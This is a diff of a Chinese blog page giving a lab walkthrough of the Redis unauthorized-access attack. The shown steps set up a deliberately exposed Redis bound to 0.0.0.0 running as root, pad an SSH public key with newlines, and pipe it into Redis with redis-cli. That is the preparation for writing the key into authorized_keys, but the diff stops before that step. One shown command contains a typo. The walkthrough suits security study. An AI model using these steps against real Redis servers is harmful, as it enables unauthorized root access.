@@ -2,8 +2,8 @@
 <html>
 
 <head>
-	<link rel="bookmark"  type="image/x-icon"  href="http://i1.bvimg.com/630402/0e2846092d14c51f.jpg"/>
-	 <link rel="shortcut icon" href="http://i1.bvimg.com/630402/0e2846092d14c51f.jpg">
+	<link rel="bookmark"  type="image/x-icon"  href="http://wx1.sinaimg.cn/mw690/86146a5fgy1fu1sk0illvj20i20i23zg.jpg"/>
+	 <link rel="shortcut icon" href="http://wx1.sinaimg.cn/mw690/86146a5fgy1fu1sk0illvj20i20i23zg.jpg">
 	
 			
     <title>
@@ -108,7 +108,7 @@
 </nav>
 
         <div id="main" >
-            <div class ="post_page_title_img" style="height: 25rem;background-image: url(http://i2.bvimg.com/630402/8f177872d1452480.png);background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;" >
+            <div class ="post_page_title_img" style="height: 25rem;background-image: url(http://wx4.sinaimg.cn/mw690/86146a5fgy1fu1tc1h1aaj208k078t8p.jpg);background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;" >
                 <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2 >Redis未授权访问</h2></a>
             </div>
             <!-- Post -->
@@ -121,23 +121,23 @@
 <hr>
 <h1 id="四-安装redis以及利用漏洞-本文均使用本机做实验"><a href="#四-安装redis以及利用漏洞-本文均使用本机做实验" class="headerlink" title="四.安装redis以及利用漏洞(本文均使用本机做实验)"></a>四.安装redis以及利用漏洞(本文均使用本机做实验)</h1><h3 id="First"><a href="#First" class="headerlink" title="First"></a>First</h3><p>在官网下载redis，使用源码编译安装 </p>
 <blockquote>
-<p>(点击此处<a href="http://download.redis.io/releases/redis-4.0.7.tar.gz" target="_blank" rel="noopener">redis</a>下载tar包)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd redis-4.0.6 </span><br><span class="line">$ make</span><br></pre></td></tr></table></figure></p>
+<p>(点击此处<a href="http://download.redis.io/releases/redis-4.0.7.tar.gz" target="_blank" rel="noopener">redis</a>下载tar包)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cd redis-4.0.6 </span><br><span class="line">$ make </span><br><span class="line">$ make install</span><br></pre></td></tr></table></figure></p>
 </blockquote>
-<p><img src="http://i2.bvimg.com/630402/daa2555bbdd10ddd.png" alt="picture1"><br>安装完成后修改配置文件redis.conf中bind 127.0.0.1修改为0.0.0.0，使之处于漏洞下。</p>
-<h3 id="Second"><a href="#Second" class="headerlink" title="Second"></a>Second</h3><p>安装ssh服务后进入配置文件修改开启公钥登录<br><img src="http://i2.bvimg.com/630402/88f312af90eabb7e.png" alt="picture2"><br>生成公钥和私钥</p>
+<p>安装完成后修改配置文件redis.conf中bind 127.0.0.1修改为0.0.0.0，使之处于漏洞下。</p>
+<h3 id="Second"><a href="#Second" class="headerlink" title="Second"></a>Second</h3><p>安装ssh服务后进入配置文件修改开启公钥登录<br>PubkeyAuthentication yes<br>生成公钥和私钥</p>
 <blockquote>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
 </blockquote>
-<p><img src="http://i2.bvimg.com/630402/8510a794a3d85c53.png" alt="picture3"><br>将公钥保存</p>
+<p><img src="http://wx4.sinaimg.cn/mw690/86146a5fgy1fu1tc1t4koj20oq0gotai.jpg" alt="picture3"><br>将公钥保存,此处前后各echo两个换行符，因为通过redis写文件时会有redis版本信息等缓存同时写入，此处如果不增加换行符，当写入公钥时会导致密钥不可读，从而ssh登录失败</p>
 <blockquote>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ (echo -r &quot;\n\n&quot;;cat id_rsa.pub;echo -e &quot;\n\n&quot; &gt; pub.txt</span><br></pre></td></tr></table></figure>
 </blockquote>
-<p><img src="http://i2.bvimg.com/630402/db2025b302a6aa39.png" alt="picture4"></p>
+<p><img src="http://wx4.sinaimg.cn/mw690/86146a5fgy1fu1tc284rzj20uu0f8wh1.jpg" alt="picture4"></p>
 <h3 id="Third"><a href="#Third" class="headerlink" title="Third"></a>Third</h3><p>在root权限下开启redis服务器</p>
 <blockquote>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ redis-server</span><br></pre></td></tr></table></figure>
 </blockquote>
-<p>登陆成功的效果<br><img src="http://i2.bvimg.com/630402/9d57098c05aefe92.png" alt="picture5"></p>
+<p>开启成功的效果<br><img src="http://wx4.sinaimg.cn/mw690/86146a5fgy1fu1tc2ohlnj211i0nr0wc.jpg" alt="picture5"></p>
 <h3 id="Fourth"><a href="#Fourth" class="headerlink" title="Fourth"></a>Fourth</h3><p>将公钥传给redis-cli</p>
 <blockquote>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat pub.txt | redis-cli -h 0.0.0.0 -x set kick</span><br></pre></td></tr></table></figure>
